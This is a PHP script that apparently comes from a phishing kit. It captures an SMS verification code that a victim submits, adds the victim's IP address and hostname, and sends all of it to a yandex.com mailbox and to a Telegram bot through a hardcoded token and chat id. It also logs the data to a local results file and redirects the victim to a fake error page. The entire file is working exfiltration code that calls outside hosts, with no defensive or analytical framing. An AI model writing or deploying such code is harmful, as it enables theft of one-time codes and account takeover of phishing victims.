<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "------- SMS 1 -------\n";
$message .= "SMS             : ".$_POST['tel']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "------------------\n";
$send = "@yandex.com";
$subject = "SMS| $ip ";
$headers = "From:SMS 2 <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('tiim.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "5380008377:AAEOB2vvo-T363FsB0gpbCOPoNP6mrbaTDM";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
$file = fopen("tiim.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: ./error-msg.php");

?>